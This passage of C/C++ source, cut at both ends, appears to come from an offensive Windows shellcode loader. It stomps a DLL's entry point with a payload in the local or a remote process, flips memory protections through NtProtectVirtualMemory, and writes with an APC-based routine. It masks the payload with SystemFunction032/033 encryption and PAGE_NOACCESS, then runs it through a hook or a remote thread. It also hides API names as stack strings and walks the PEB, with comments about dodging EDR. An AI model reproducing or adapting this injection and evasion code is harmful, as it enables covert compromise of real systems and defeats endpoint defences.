    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileBase + dosHeader->e_lfanew);

    if(bRemoteInjection) {
        dosHeader = (PIMAGE_DOS_HEADER)malloc(sizeof(IMAGE_DOS_HEADER));
        if (!ReadProcessMemory(hProcess, (LPCVOID)fileBaseRemote, dosHeader, sizeof(IMAGE_DOS_HEADER), NULL)) {
            printf("Failed to read DOS header. Error: %x\n", GetLastError());
            return 1;
        }
        printf("[+] DOS header read successfully from remote process: %p\n", dosHeader);

        PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)malloc(sizeof(IMAGE_NT_HEADERS));
        if (!ReadProcessMemory(hProcess, (LPCVOID)((DWORD_PTR)fileBaseRemote + dosHeader->e_lfanew), ntHeader, sizeof(IMAGE_NT_HEADERS), NULL)) {
            printf("Failed to read NT header. Error: %x\n", GetLastError());
            return 1;
        }
        printf("[+] NT header read successfully from remote process: %p\n", ntHeader);
    }

    // PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileBase + dosHeader->e_lfanew);
    // printf("[+] NT header: %p\n", ntHeader);
    // DWORD entryPointRVA = ntHeader->OptionalHeader.AddressOfEntryPoint;
    DWORD entryPointRVA = ntHeader->OptionalHeader.AddressOfEntryPoint;
    printf("[+] Entry point RVA: %p\n", entryPointRVA);

    // Size of the DLL in memory
    // SIZE_T dllSize = ntHeader->OptionalHeader.SizeOfImage;
    SIZE_T dllSize = ntHeader->OptionalHeader.SizeOfImage;
    printf("[+] DLL size: %lu\n", dllSize);


    //####END####


    // Load the DLL to get its base address in current process
    // HMODULE hDll = LoadLibraryW(dllPath); //Normal loading
    // HMODULE hDll = dynamic::loadFuture(dllPath); //invisible loading

    // if (hDll == NULL) {
    //     printf("Failed to load DLL. Error: %lu\n", GetLastError());
    //     if(bUseLdrLoadDll) {
    //         UnmapViewOfFile(fileBase);
    //     } else {
    //         UnmapViewOfFile(fileHandle);
    //         UnmapViewOfFile(fileBase);
    //         CloseHandle(hSection);
    //     }
    //     return 1;
    // } else { 
	// 	printf("[+] DLL loaded.\n");
	// }

    // Calculate the AddressOfEntryPoint in current process
    // LPVOID dllEntryPoint = (LPVOID)(entryPointRVA + (DWORD_PTR)hDll);
	// printf("[+] DLL entry point: %p\n", dllEntryPoint);
    dllEntryPoint = NULL;
    if(bRemoteInjection) {
        dllEntryPoint = (PVOID)((DWORD_PTR)fileBaseRemote + entryPointRVA);
    } else {
        dllEntryPoint = (PVOID)((DWORD_PTR)fileBase + entryPointRVA);
    }
	printf("[+] Remote DLL entry point: %p\n", dllEntryPoint);

	// printf("[+] DLL entry point: %p\n", dllEntryPoint);
    // wprintf(L"DLL %ls added to PEB lists\n", dllPath);

    // Overwrite the AddressOfEntryPoint with magiccode
    // SIZE_T bytesWritten;
    // BOOL result = WriteProcessMemory(GetCurrentProcess(), dllEntryPoint, magiccode, sizeof(magiccode), &bytesWritten);

    ///////////////////////////// Let's get the memory protection of the target DLL's entry point before any modification: 
    
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T result;

    result = VirtualQueryEx(hProcess, dllEntryPoint, &mbi, sizeof(mbi));

    if (result == 0) {
        printf("VirtualQueryEx failed. Error: %lu\n", GetLastError());
    } else {
        printf("[+] Default memory protection in target DLL is: %s\n", ProtectionToString(mbi.Protect));
    }

    SIZE_T magiccodeSize = sizeof(magiccode);
    printf("[**] magiccodeSize: %lu\n", magiccodeSize);

    printf("[*] dllEntryPoint: %p\n", dllEntryPoint);

    // DWORD oldProtect = 0;
    // if (!VirtualProtectEx(hProcess, dllEntryPoint, magiccodeSize, PAGE_READWRITE, &oldProtect)) {
    //     printf("VirtualProtectEx failed to change memory protection. Error: %lu\n", GetLastError());
    //     CloseHandle(hProcess);
    //     return 1;
    // }

    // if (!VirtualProtect(dllEntryPoint, magiccodeSize, PAGE_READWRITE, &oldProtect)) {
    //     printf("VirtualProtect failed to change memory protection. Error: %lu\n", GetLastError());
    //     CloseHandle(hProcess);
    //     return 1;
    // }

    // NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)dynamic::NotGetProcAddress(GetModuleHandleA("ntdll"), "NtProtectVirtualMemory");
    //use the normal way:
    // NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(GetModuleHandleA("ntdll"), "NtProtectVirtualMemory");


    PVOID baseAddress = dllEntryPoint; // BaseAddress must be a pointer to the start of the memory region
    regionSize = magiccodeSize; // The size of the region
    ULONG oldProtect;

    // print magiccodeSize:
    printf("[+] magiccodeSize: %lu\n", magiccodeSize);
    //printf regionSize: 
    printf("[+] regionSize: %lu\n", regionSize);
    /// print lots of characters to attract attention:
    printf("[+] Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! \n");


    status = NtProtectVirtualMemory(
        hProcess,
        &baseAddress, // NtProtectVirtualMemory expects a pointer to the base address
        &regionSize, // A pointer to the size of the region
        PAGE_READWRITE, // The new protection attributes 
        &oldProtect); // The old protection attributes

    if(status != STATUS_SUCCESS) {
        printf("NtProtectVirtualMemory failed to change memory protection. Status: %x\n", status);
        return 1;
    } else {
        printf("[+] Memory protection after before was: %s\n", ProtectionToString(oldProtect));
    }
    // printf("[+] Default memory protection before change in target DLL was: %s\n", ProtectionToString(oldProtect));

    if (hProcess != NULL) {
        result = WriteProcessMemoryAPC(hProcess, (BYTE*)dllEntryPoint, (BYTE*)magiccode, magiccodeSize, bUseRtlCreateUserThread, bUseCreateThreadpoolWait); 
    }


    // use WriteProcessMemoryAPC to Write hook stub to the current process memory after the dllEntryPoint plus the magiccodeSize:
    // PVOID hookStub = (PVOID)((DWORD_PTR)dllEntryPoint + magiccodeSize + 8);
    // SIZE_T hookStubSize = HOOKSTUB_SIZE;

    // // Now you can use hookStubSize in your WriteProcessMemory or any other function.
    // printf("HookStub size: %zu\n", hookStubSize);
    // printf("[*] hookStub: %p\n", hookStub);
    // printf("[*] HookStubSize: %lu\n", hookStubSize);
    // //print the address of func HookStub:
    // printf("[+] HookStub @ %p\n", HookStub);

    // // DWORD oldProtect = 0;
    // // if (!VirtualProtectEx(hProcess, hookStub, hookStubSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
    // //     printf("VirtualProtectEx failed to change memory protection. Error: %lu\n", GetLastError());
    // //     CloseHandle(hProcess);
    // //     return 1;
    // // }
    // result = WriteProcessMemoryAPC(hProcess, (BYTE*)hookStub, (BYTE*)HookStub, hookStubSize, bUseRtlCreateUserThread, bUseCreateThreadpoolWait);
    // // print the allocated hookStub:
    // printf("[+] HookStub re-allocated @ %p\n", hookStub);
    // printf("[+] If we check the remote process memory, we should see mapped HookStub code \n");
    // printf("[+] press any key to continue\n");
    // getchar();


    // if (!VirtualProtectEx(hProcess, dllEntryPoint, magiccodeSize, oldProtect, &oldProtect)) {
    //     printf("[-] VirtualProtectEx failed to restore original memory protection. Error: %lu\n", GetLastError());
    // }

    // if (!VirtualProtect(dllEntryPoint, magiccodeSize, oldProtect, &oldProtect)) {
    //     printf("[-] VirtualProtect failed to restore original memory protection. Error: %lu\n", GetLastError());
    // }
    /// sleep for 2 seconds:
    // SimpleSleep(2000);
    /// NtProtectVirtualMemory cause Modified code flags in .text and .rdata section in the target DLL.

    if (result) {
        printf("Failed to APC write magiccode. Error: %lu\n", GetLastError());
        // FreeLibrary(hDll);
        // CloseHandle(hSection);
        UnmapViewOfFile(fileBase);
        // CloseHandle(fileMapping);
        // CloseHandle(fileHandle);
        // return 1;
    } else {
		printf("[+] Magic code written with APC write.\n");
        printf("[+] press any key to continue\n");
        getchar();
        // SimpleSleep(10000);
	}

    if(bUseNoAccess && !bRemoteInjection) {
        // // make it disappear with sys func 32: 
        const char sysfunc32Char[] = { 'S', 'y', 's', 't', 'e', 'm', 'F', 'u', 'n', 'c', 't', 'i', 'o', 'n', '0', '3', '2', 0 };
        initialize_keys();
        initialize_data((char*)dllEntryPoint, magiccodeSize); 
        // sysfunc32 = (SystemFunction032_t)GetProcAddress(LoadLibrary("advapi32.dll"), sysfunc32Char);
        sysfunc32 = (SystemFunction032_t)GetProcAddress(LoadLibrary("advapi32.dll"), "SystemFunction032");
        NTSTATUS eny = sysfunc32(&pData, &pKey);
        if(eny != STATUS_SUCCESS) {
            printf("[-] sysfunc32 failed to encrypt the data. Status: %x\n", eny);
        } else {
            printf("[+] sysfunc32 succeeded to encrypt the data.\n");
        }
        // for (int i = 0; i < 16; i++) {
        //     r = rand();
        //     key[i] = (char) r;
        // }
        // //print tyhe key value:
        // printf("[+] XOR key: ");
        // for (int i = 0; i < 16; i++) {
        //     printf("%02x", key[i]);
        // }
        // // encrypt the payload
        // DWORD oldPal = 0;
        // sUrprise((char *)(LPVOID)baseAddress, regionSize, key, sizeof(key));
        // printf("[+] Global dllEntryPoint memory encoded with XOR \n");
        printf("[+] press any key to continue\n");
        getchar();
    }
    ULONG Protect = PAGE_EXECUTE_READ;
    if(bUseNoAccess) {
        Protect = PAGE_NOACCESS;
    }

    

    status = NtProtectVirtualMemory(
        hProcess,
        &baseAddress, // NtProtectVirtualMemory expects a pointer to the base address
        &regionSize, // A pointer to the size of the region
        Protect, // The new protection attributes, PAGE_EXECUTE_READ
        // PAGE_EXECUTE_WRITECOPY, 
        &oldProtect); // The old protection attributes
    if(status != STATUS_SUCCESS) {
        printf("[-] NtProtectVirtualMemory failed to restore original memory protection. Status: %x\n", status);
    } else {
        printf("[+] Memory protection before change was: %s\n", ProtectionToString(oldProtect));
    }
    //print both in hex and in string in one line:
    printf("[+] Original memory protection was: %s (0x%08X)\n", ProtectionToString(oldProtect), oldProtect);
        
    


    // PIMAGE_DOS_HEADER dosHeader1 = (PIMAGE_DOS_HEADER)fileBase;
    // PIMAGE_NT_HEADERS ntHeader1 = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileBase + dosHeader1->e_lfanew);
    // DWORD entryPointRVA1 = ntHeader1->OptionalHeader.AddressOfEntryPoint;
    // // //Write to .text section
    // PVOID dllEntryPoint1 = (PVOID)(entryPointRVA1 + (DWORD_PTR)fileBase);

    // PIMAGE_TLS_CALLBACK *callback_decoy;
    // PIMAGE_DATA_DIRECTORY tls_entry_decoy = &ntHeader1->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];

    // if(tls_entry_decoy->Size) {
    //     PIMAGE_TLS_DIRECTORY tls_dir_decoy = (PIMAGE_TLS_DIRECTORY)((unsigned long long int)fileBase + tls_entry_decoy->VirtualAddress);
    //     callback_decoy = (PIMAGE_TLS_CALLBACK *)(tls_dir_decoy->AddressOfCallBacks);
    //     for(; *callback_decoy; callback_decoy++)
    //         (*callback_decoy)((LPVOID)fileBase, DLL_PROCESS_ATTACH, NULL);
    // }
    // // Use function pointer to call the DLL entry point 2nd time.
    // DLLEntry DllEntry1 = (DLLEntry)((unsigned long long int)fileBase + entryPointRVA1);
    // // (*DllEntry1)((HINSTANCE)fileBase, DLL_PROCESS_ATTACH, 0);


    const char getLib[] = { 'n', 't', 'd', 'l', 'l', 0 };

    if(bRemoteInjection) {


        // // This is for execution method 1: 
        // if(bUseNoAccess) {
        //     // //change the memory protection back to PAGE_EXECUTE_READ:
        //         status = NtProtectVirtualMemory(
        //         hProcess,
        //         &baseAddress, // NtProtectVirtualMemory expects a pointer to the base address
        //         &regionSize, // A pointer to the size of the region
        //         PAGE_EXECUTE_READ, // The new protection attributes, PAGE_EXECUTE_READ
        //         // PAGE_EXECUTE_WRITECOPY, 
        //         &oldProtect); // The old protection attributes
        //     if(status != STATUS_SUCCESS) {
        //         printf("[-] NtProtectVirtualMemory failed to restore original memory protection. Status: %x\n", status);
        //     } else {
        //         printf("[+] Memory protection before change was: %s\n", ProtectionToString(oldProtect));
        //     }
        // }

        // // use createRemoteThread to call remoteEntryPoint: 

        // // // Create a thread in the remote process that starts execution at the remote DLL entry point
        // // We can put the thread in alterable state and ask it to have a start address at anywhere we like. 
        // HANDLE hThread = CreateRemoteThread(
        //     hProcess,                    // Handle to the remote process
        //     NULL,                        // No security attributes
        //     0,                           // Default stack size
        //     (LPTHREAD_START_ROUTINE)0x1337,  // Entry point of the remote DLL
        //     NULL,                        // No arguments to pass
        //     CREATE_SUSPENDED,                           // No special flags
        //     NULL                         // Don't need the thread ID
        // );

        



        // // if (hThread == NULL) {
        // //     printf("Failed to create remote thread. Error: %x\n", GetLastError());
        // //     return 1;
        // // } else { 
        // //     printf("[+] Remote thread created successfully at address: %p\n", dllEntryPoint);
        // // }


        // // // Wait for the thread to finish executing
        // // WaitForSingleObject(hThread, INFINITE);

        // // TODO: now, use other method to call remote DLL entry point: 

        // // RtlDispatchAPC_t RtlDispatchAPC = (RtlDispatchAPC_t)dynamic::NotGetProcAddress(GetModuleHandleA(getLib), MAKEINTRESOURCE(8));
        // // if(!RtlDispatchAPC) {
        // //     printf("[-] Failed to locate RtlDispatchAPC.\n");
        // //     return 1;
        // // } else {
        // //     printf("[+] RtlDispatchAPC located.\n");
        // //     //print the func addr:
        // //     printf("[+] RtlDispatchAPC: %p\n", RtlDispatchAPC);
        // // }

        // // // call RtlDispatchAPC to execute DllEntry1:
        // // // Prepare the arguments for RtlDispatchAPC
        // // PAPCFUNC apcFunction = (PAPCFUNC)dllEntryPoint;
        // // ULONG_PTR apcArgument1 = (ULONG_PTR)fileBaseRemote;
        // // APC_ACTIVATION_CTX apcArgument2;
        // // apcArgument2.Value = 0; // Initialize the union as needed

        // // // Call RtlDispatchAPC with the prepared arguments
        // // printf("[+] Calling RtlDispatchAPC to execute DllEntry.\n");
        // // result = RtlDispatchAPC(apcFunction, apcArgument1, apcArgument2);

        // // if(result != STATUS_SUCCESS) {
        // //     printf("[-] RtlDispatchAPC failed to execute DllEntry1. Status: %x\n", result);
        // //     return 1;
        // // } else {
        // //     printf("[+] DllEntry1 executed successfully.\n");
        // // }
        // // //pass RtlDispatchAPC_t to pNtQueueApcThread to call DllEntry1:
        // const char NtQueueFutureApcEx2Str[] = { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x', '2', 0 };
        // NtQueueApcThreadEx2_t pNtQueueApcThread = (NtQueueApcThreadEx2_t)dynamic::NotGetProcAddress(GetModuleHandle(getLib), NtQueueFutureApcEx2Str);

        // // // // Prepare the arguments for NtQueueApcThreadEx2
        // // // HANDLE hThread = GetCurrentThread();
        // HANDLE userApcReserveHandle = NULL; // Adjust as necessary
        // QUEUE_USER_APC_FLAGS queueUserApcFlags = QUEUE_USER_APC_FLAGS_NONE;

        // // Call NtQueueApcThreadEx2 with the prepared arguments
        // // result = pNtQueueApcThread(
        // //     hThread,
        // //     userApcReserveHandle,
        // //     queueUserApcFlags,
        // //     (PVOID)RtlDispatchAPC,
        // //     (PVOID)apcFunction,
        // //     (PVOID)apcArgument1,
        // //     (PVOID)&apcArgument2
        // // ); 
        // result = pNtQueueApcThread(
        //     hThread,
        //     userApcReserveHandle,
        //     queueUserApcFlags,
        //     (PVOID)dllEntryPoint,
        //     NULL,
        //     (PVOID)NULL,
        //     (PVOID)NULL
        // ); 
        // if(result != STATUS_SUCCESS) {
        //     printf("[-] NtQueueApcThreadEx2 failed to execute DllEntry1. Status: %x\n", result);
        //     return 1;
        // } else {
        //     printf("[+] DllEntry executed successfully.\n");
        // }

        // // resume thread:
        // DWORD dwResumeResult = ResumeThread(hThread);
        // if (dwResumeResult == (DWORD)-1) {
        //     printf("Failed to resume remote thread. Error: %x\n", GetLastError());

        // } else {
        //     printf("[+] Thread resumed. /n");
        // }


        // alternative execution method: 
        DLLEntry DllEntry1 = (DLLEntry)(dllEntryPoint);
        // (*DllEntry1)((HINSTANCE)fileBase, DLL_PROCESS_ATTACH, 0);
        DllEntryGlobal = DllEntry1;
        fileBaseGlobal = fileBase;


        // install hook
        printf("[!] Installing hook...\n\n");
        if(InstallHookRemote() != 0)
        {
            return 1;
        }

        printf("[+] press any key to continue\n");
        getchar();

        pRtlExitUserThread ExitThread = (pRtlExitUserThread)dynamic::NotGetProcAddress(GetModuleHandle(getLib), "RtlExitUserThread");


        // TODO: we can put this into hooked stub. For remote injection, we are temporarily put this here. 
        if(bUseNoAccess) {
            // // //change the memory protection back to PAGE_EXECUTE_READ:
            //     status = NtProtectVirtualMemory(
            //     hProcess,
            //     &dllEntryPoint, // NtProtectVirtualMemory expects a pointer to the base address
            //     &regionSize, // A pointer to the size of the region
            //     PAGE_READWRITE, // The new protection attributes, PAGE_EXECUTE_READ
            //     // PAGE_EXECUTE_WRITECOPY, 
            //     &oldProtect); // The old protection attributes
            // if(status != STATUS_SUCCESS) {
            //     printf("[-] NtProtectVirtualMemory failed to restore original memory protection. Status: %x\n", status);
            // } else {
            //     printf("[+] Memory protection before change was: %s\n", ProtectionToString(oldProtect));
            // }

            /// TODO: use RtlRemoteCall or other inter process communication to call decryption stub  in remote proc to 
            /// restore the memory access and decrypt the payload.
            
            // initialize_data((char*)dllEntryPoint, regionSize); 
            // // write stack string for SystemFunction033:
            // const char sysfunc33Char[] = { 'S', 'y', 's', 't', 'e', 'm', 'F', 'u', 'n', 'c', 't', 'i', 'o', 'n', '0', '3', '3', 0 };
            // SystemFunction033 = (SystemFunction033_t)GetProcAddress(LoadLibrary("advapi32.dll"), sysfunc33Char);
            // NTSTATUS eny = SystemFunction033(&pData, &pKey);
            // if(eny != STATUS_SUCCESS) {
            //     printf("[-] SystemFunction033 failed to encrypt the data. Status: %x\n", eny);
            // } else {
            //     printf("[+] SystemFunction033 succeeded to encrypt the data.\n");
            // }
            // printf("[+] Restoring payload memory access and decrypting with XOR. \n");
            // DWORD oldPal = 0;
            // // Change the memory back to XR for execution...
            // sUrprise((char *) dllEntryPoint, regionSize, key, sizeof(key));
        }



        // TODO: we can put this into hooked stub.
        if(bUseNoAccess) {
            // //change the memory protection back to PAGE_EXECUTE_READ:
                status = NtProtectVirtualMemory(
                hProcess,
                &baseAddress, // NtProtectVirtualMemory expects a pointer to the base address
                &regionSize, // A pointer to the size of the region
                PAGE_EXECUTE_READ, // The new protection attributes, PAGE_EXECUTE_READ
                // PAGE_EXECUTE_WRITECOPY, 
                &oldProtect); // The old protection attributes
            if(status != STATUS_SUCCESS) {
                printf("[-] NtProtectVirtualMemory failed to restore original memory protection. Status: %x\n", status);
            } else {
                printf("[+] Memory protection before change was: %s\n", ProtectionToString(oldProtect));
            }
        }

        // create a thread to call ExitThread, not hooked function:
        HANDLE hThread = NULL;
        DWORD threadId = 0;

        hThread = CreateRemoteThread(
                hProcess,          // Handle to the target process
                NULL,              // Default security attributes
                0,                 // Stack size (0 = default)
                (LPTHREAD_START_ROUTINE)ExitThread,  // Thread start routine (ExitThread)
                NULL,              // Thread parameter (None, since ExitThread takes no parameters)
                0,                 // Creation flags
                &threadId          // Thread ID
        );

        if (hThread == NULL) {
            printf("Failed to create thread. Error: %x\n", GetLastError());
            return 1;
        } else {
            printf("[+] Thread created successfully.\n");
        } 

        // Optionally, wait for the remote thread to finish execution
        WaitForSingleObject(hThread, INFINITE);
    } else {



        DLLEntry DllEntry1 = (DLLEntry)(dllEntryPoint);
        if(!bUseNoAccess) {
            (*DllEntry1)((HINSTANCE)fileBase, DLL_PROCESS_ATTACH, 0);
        } 
        else 
        {
            DllEntryGlobal = DllEntry1;
            fileBaseGlobal = fileBase;


            // install hook
            printf("[!] Installing hook...\n\n");
            if(InstallHook() != 0)
            {
                return 1;
            }

            pRtlExitUserThread ExitThread = (pRtlExitUserThread)dynamic::NotGetProcAddress(GetModuleHandle(getLib), "RtlExitUserThread");

            // create a thread to call ExitThread, not hooked function:
            HANDLE hThread = NULL;
            DWORD threadId = 0;
            hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExitThread, NULL, 0, &threadId);
            if (hThread == NULL) {
                printf("Failed to create thread. Error: %x\n", GetLastError());
                return 1;
            } else {
                printf("[+] Thread created successfully.\n");
            }
            // wait for 
            WaitForSingleObject(hThread, INFINITE);
        }
        
        
        

    }
    // CloseHandle(hThread);
    // FreeLibrary(hDll);
    // if(bUseLdrLoadDll) {
    //     UnmapViewOfFile(fileBase);
    // } else {
    //     UnmapViewOfFile(fileHandle);
    //     UnmapViewOfFile(fileBase);
    //     CloseHandle(hSection);
    // }
    // CloseHandle(fileMapping);
    // CloseHandle(fileHandle);
    // CloseHandle(hSection);
    // Terminate the process
    // ExitProcess(0);
    return 0;


}



BOOL PrintSectionDetails(const wchar_t* dllPath) {
    HANDLE hFile = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"Failed to open file %ls for section details. Error: %lu\n", dllPath, GetLastError());
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* fileBuffer = (BYTE*)malloc(fileSize);
    if (!fileBuffer) {
        CloseHandle(hFile);
        wprintf(L"Memory allocation failed for reading file %ls.\n", dllPath);
        return FALSE;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, fileBuffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        free(fileBuffer);
        CloseHandle(hFile);
        wprintf(L"Failed to read file %ls. Error: %lu\n", dllPath, GetLastError());
        return FALSE;
    }

    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)fileBuffer;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(fileBuffer + dosHeader->e_lfanew);
    wprintf(L"Details for %ls:\n", dllPath);
    wprintf(L"  Size of Image: 0x%X\n", ntHeaders->OptionalHeader.SizeOfImage); // Print Size of Image
    IMAGE_SECTION_HEADER* sectionHeaders = (IMAGE_SECTION_HEADER*)((BYTE*)ntHeaders + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + ntHeaders->FileHeader.SizeOfOptionalHeader);

    wprintf(L"Details for %ls:\n", dllPath);
    wprintf(L"  Number of sections: %d\n", ntHeaders->FileHeader.NumberOfSections);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        IMAGE_SECTION_HEADER* section = &sectionHeaders[i];
        wprintf(L"  Section %d: %.*S\n", i + 1, IMAGE_SIZEOF_SHORT_NAME, section->Name);
        wprintf(L"    Virtual Size: 0x%X\n", section->Misc.VirtualSize);
        wprintf(L"    Virtual Address: 0x%X\n", section->VirtualAddress);
        wprintf(L"    Size of Raw Data: 0x%X\n", section->SizeOfRawData);
    }

    free(fileBuffer);
    CloseHandle(hFile);
    return TRUE;
}


void hooked_function() {
    printf("[^_^] VMT hooked pointer called.\n");

    printf("[-_-] press any key to continue\n");
    getchar();

    hProcess = GetCurrentProcess();
    ULONG oldProtect;

    // if VMT is used, we do PAGE change here: 
        // TODO: we can put this into hooked stub.

    NTSTATUS status;
    // TODO: we can put this into hooked stub.
    if(bUseNoAccess) {
        // //change the memory protection back to PAGE_EXECUTE_READ:
            status = NtProtectVirtualMemory(
            hProcess,
            &dllEntryPoint, // NtProtectVirtualMemory expects a pointer to the base address
            &regionSize, // A pointer to the size of the region
            PAGE_READWRITE, // The new protection attributes, PAGE_EXECUTE_READ
            // PAGE_EXECUTE_WRITECOPY, 
            &oldProtect); // The old protection attributes
        if(status != STATUS_SUCCESS) {
            printf("[-] NtProtectVirtualMemory failed to restore original memory protection. Status: %x\n", status);
        } else {
            printf("[+] Memory protection before change was: %s\n", ProtectionToString(oldProtect));
        }

        // initialize_data((char*)dllEntryPoint, regionSize); 
        // write stack string for SystemFunction033:
        const char sysfunc33Char[] = { 'S', 'y', 's', 't', 'e', 'm', 'F', 'u', 'n', 'c', 't', 'i', 'o', 'n', '0', '3', '3', 0 };
        SystemFunction033 = (SystemFunction033_t)GetProcAddress(LoadLibrary("advapi32.dll"), sysfunc33Char);
        status = SystemFunction033(&pData, &pKey);
        if(status != STATUS_SUCCESS) {
            printf("[-] SystemFunction033 failed to decrypt the data. Status: %x\n", status);
        } else {
            printf("[+] SystemFunction033 succeeded to decrypt the data.\n");
        }
        printf("[+] Restoring payload memory access and decrypting\n");
        // DWORD oldPal = 0;
        // // Change the memory back to XR for execution...
        // sUrprise((char *) dllEntryPoint, regionSize, key, sizeof(key));
    

        // //change the memory protection back to PAGE_EXECUTE_READ:
            status = NtProtectVirtualMemory(
            hProcess,
            &dllEntryPoint, // NtProtectVirtualMemory expects a pointer to the base address
            &regionSize, // A pointer to the size of the region
            PAGE_EXECUTE_READ, // The new protection attributes, PAGE_EXECUTE_READ
            // PAGE_EXECUTE_WRITECOPY, 
            &oldProtect); // The old protection attributes
        if(status != STATUS_SUCCESS) {
            printf("[-] NtProtectVirtualMemory failed to restore original memory protection. Status: %x\n", status);
        } else {
            printf("[+] Memory protection before change was: %s\n", ProtectionToString(oldProtect));
        }
    }

    printf("[-_-] press any key to continue\n");
    getchar();

    // m1: 
    // (*DllEntryGlobal)((HINSTANCE)fileBaseGlobal, DLL_PROCESS_ATTACH, 0);
    (*DllEntryGlobal)((HINSTANCE)fileBaseGlobal, DLL_THREAD_DETACH, 0);
    // m2: 
    // void (*magiccode_func)() = (void (*)())DllEntryGlobal;
    // magiccode_func();
    

}


ADDR *GetNtdllBase() {

    //1st method: 
    // void *ntdllBase = NULL;
    // PPEB_LDR_DATA ldr = NULL;
    // PPEB pPEB = NULL;

    /// get PEB: 
    // #ifdef _WIN64
    //     pPEB = (PPEB)__readgsqword(0x60); // Read PEB address from the GS segment register
    // #else
    //     pPEB = (PPEB)__readfsdword(0x30); // Read PEB address from the FS segment register
    // #endif

    // #ifdef _WIN64
    //     __asm__ volatile (
    //         "movq %%gs:0x60, %0" // Read PEB address from the GS segment register, PEB is pointed by a pointer at offset 0x60 to the TEB. 
    //         : "=r" (pPEB)
    //     );
    // #else
    //     __asm__ volatile (
    //         "movl %%fs:0x30, %0" // Read PEB address from the FS segment register
    //         : "=r" (pPEB)
    //     );
    // #endif
    // // Walk PEB: 
    // DWORD64 qwNtdllBase = (DWORD64)pPEB->Ldr & ~(0x10000 - 1); //Align the Ldr addr to 64kb boundary. 
    // while (1) {
    //     IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)qwNtdllBase;
    //     if (dosHeader->e_magic == IMAGE_DOS_SIGNATURE) { // contain valid DOS header? 
    //         IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(qwNtdllBase + dosHeader->e_lfanew);
    //         if (ntHeaders->Signature == IMAGE_NT_SIGNATURE) {  //Valid NT header? 
    //             printf("[+] Ntdll base address found: %p\n", (void*)qwNtdllBase); //First valid module is ntdll.dll
    //             return (ADDR*)qwNtdllBase;
    //         }
    //     }
    //     qwNtdllBase -= 0x10000; //Windows loader aligns DLLs to 64kb boundary to simplify address space layout. 
    //     if (qwNtdllBase == 0) {
    //         printf("[-] Ntdll base address not found\n");
    //         return 0;
    //     }
    // }

    //2nd: 
    // while (1) {
    //     IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)qwNtdllBase;
    //     if (dosHeader->e_magic == IMAGE_DOS_SIGNATURE) {
    //         IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(qwNtdllBase + dosHeader->e_lfanew);
    //         if (ntHeaders->Signature == IMAGE_NT_SIGNATURE && ntHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
    //             printf("[+] Ntdll base address found: %p\n", (void*)qwNtdllBase);
    //             return (ADDR*)qwNtdllBase;
    //         }
    //     }
    //     qwNtdllBase -= 0x10000;
    //     if (qwNtdllBase == 0) {
    //         printf("[-] Ntdll base address not found\n");
    //         return 0;
    //     }
    // }

    
    //2nd method: 
    void *ntdllBase = NULL;
    PPEB_LDR_DATA ldr = NULL;
    PPEB pPEB = NULL;
    PLDR_DATA_TABLE_ENTRY_FREE dte = NULL;

    #ifdef _WIN64
        __asm__ volatile (
            "movq %%gs:0x60, %0" // Read PEB address from the GS segment register
            : "=r" (pPEB)
        );
    #else
        __asm__ volatile (
            "movl %%fs:0x30, %0" // Read PEB address from the FS segment register
            : "=r" (pPEB)
        );
    #endif

    // Get PEB_LDR_DATA
    ldr = pPEB->Ldr;

    // // Iterate through InMemoryOrderModuleList to find ntdll.dll
    // LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
    // LIST_ENTRY* current = head->Flink;

    // while (current != head) {
    //     dte = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY_FREE, InMemoryOrderLinks);

    //     // Print the base address and name of each module
    //     wprintf(L"Module: %ls, Base Address: %p\n", dte->BaseDllName.Buffer, dte->DllBase);

    //     // Check if the BaseDllName matches "ntdll.dll"
    //     if (wcscmp(dte->BaseDllName.Buffer, L"ntdll.dll") == 0) {
    //         ntdllBase = dte->DllBase;
    //         break;
    //     }

    //     current = current->Flink;
    // }

    // Get the 2nd entry in the InMemoryOrderModuleList, but if EDR injects fake DLL, it will not be the 2nd entry.

    // Get the first entry (the application itself)
    LIST_ENTRY* firstEntry = ldr->InMemoryOrderModuleList.Flink;
    // Get the second entry (ntdll.dll)
    LIST_ENTRY* secondEntry = firstEntry->Flink;

    // Get the LDR_DATA_TABLE_ENTRY_FREE for ntdll.dll
